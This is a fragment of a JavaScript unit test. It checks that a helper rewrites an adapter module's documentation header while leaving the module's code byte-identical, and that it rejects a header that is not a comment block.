    const doc = '/**\n * Rewritten header. What it does: it maps nothing, on purpose. Detects: nothing. Maps: nothing. Leaves in place: everything. Needs: nothing. Limits: none.\n */'
    const out = im.withDocHeader(OK_ADAPTER(), doc)
    expect(im.docHeader(out)).toBe(doc)
    expect(out.slice(out.indexOf('export default'))).toBe(OK_ADAPTER().slice(OK_ADAPTER().indexOf('export default')))   // the code is byte-identical
    expect(() => im.withDocHeader(OK_ADAPTER(), 'not a comment')).toThrow(/comment block/)
  })
})
